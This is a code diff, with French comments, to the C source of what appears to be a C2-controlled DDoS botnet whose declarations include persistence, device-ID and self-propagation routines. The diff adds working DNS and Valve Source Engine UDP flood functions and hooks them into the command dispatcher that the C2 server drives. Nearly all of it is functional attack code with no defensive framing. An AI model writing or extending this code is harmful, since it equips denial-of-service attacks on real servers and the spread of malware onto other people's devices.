@@ -59,6 +59,8 @@
  void arme_attack(char* target, int port, int duration);
  void hulk_attack(char* target, int port, int duration);
  void bypass_attack(char* target, int port, int duration);
+ void dns_flood(char* target, int duration);
+ void vse_flood(char* target, int port, int duration);
  void persist(void);
  void generate_device_id(void);
  void auto_propagate(void);
@@ -724,6 +726,71 @@
      }
  }
  
+ // Fonction pour exécuter une attaque DNS Flood (Amplification simulée)
+ void dns_flood(char* target, int duration) {
+     int sock;
+     struct sockaddr_in target_addr;
+     time_t start_time = time(NULL);
+     
+     unsigned char dns_packet[] = {
+         0xab, 0xcd, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+         0x03, 0x77, 0x77, 0x77, 0x06, 0x67, 0x6f, 0x6f, 0x67, 0x6c, 0x65, 0x03,
+         0x63, 0x6f, 0x6d, 0x00, 0x00, 0x01, 0x00, 0x01
+     };
+     
+     memset(&target_addr, 0, sizeof(target_addr));
+     target_addr.sin_family = AF_INET;
+     target_addr.sin_port = htons(53);
+     if (inet_pton(AF_INET, target, &target_addr.sin_addr) <= 0) return;
+     
+     sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+     if (sock != -1) {
+         int flags = fcntl(sock, F_GETFL, 0);
+         if (flags != -1) fcntl(sock, F_SETFL, flags | O_NONBLOCK);
+         
+         while (time(NULL) - start_time < duration) {
+             for (int i = 0; i < 100; i++) {
+                 sendto(sock, dns_packet, sizeof(dns_packet), 0,
+                        (struct sockaddr*)&target_addr, sizeof(target_addr));
+             }
+             usleep(500);
+         }
+         close(sock);
+     }
+ }
+ 
+ // Fonction pour exécuter une attaque VSE (Valve Source Engine) Flood
+ void vse_flood(char* target, int port, int duration) {
+     int sock;
+     struct sockaddr_in target_addr;
+     time_t start_time = time(NULL);
+     
+     unsigned char vse_packet[] = {
+         0xff, 0xff, 0xff, 0xff, 0x54, 0x53, 0x6f, 0x75, 0x72, 0x63, 0x65, 0x20,
+         0x45, 0x6e, 0x67, 0x69, 0x6e, 0x65, 0x20, 0x51, 0x75, 0x65, 0x72, 0x79, 0x00
+     };
+     
+     memset(&target_addr, 0, sizeof(target_addr));
+     target_addr.sin_family = AF_INET;
+     target_addr.sin_port = htons(port);
+     if (inet_pton(AF_INET, target, &target_addr.sin_addr) <= 0) return;
+     
+     sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+     if (sock != -1) {
+         int flags = fcntl(sock, F_GETFL, 0);
+         if (flags != -1) fcntl(sock, F_SETFL, flags | O_NONBLOCK);
+         
+         while (time(NULL) - start_time < duration) {
+             for (int i = 0; i < 100; i++) {
+                 sendto(sock, vse_packet, sizeof(vse_packet), 0,
+                        (struct sockaddr*)&target_addr, sizeof(target_addr));
+             }
+             usleep(500);
+         }
+         close(sock);
+     }
+ }
+ 
  // Fonction principale pour exécuter une attaque DDoS
  void ddos_attack(int c2_socket, char* target, int port, int duration, char* method) {
      // Envoyer un message de confirmation au serveur C2
@@ -752,8 +819,12 @@
          arme_attack(target, port, duration);
      } else if (strcmp(method, "HULK") == 0) {
          hulk_attack(target, port, duration);
-     } else if (strcmp(method, "BYPASS") == 0) {
+     } else if (strcmp(method, "bypass") == 0) {
          bypass_attack(target, port, duration);
+     } else if (strcmp(method, "dns") == 0) {
+         dns_flood(target, duration);
+     } else if (strcmp(method, "vse") == 0) {
+         vse_flood(target, port, duration);
      } else {
          // Méthode par défaut : combinaison de plusieurs attaques
          pid_t pid;
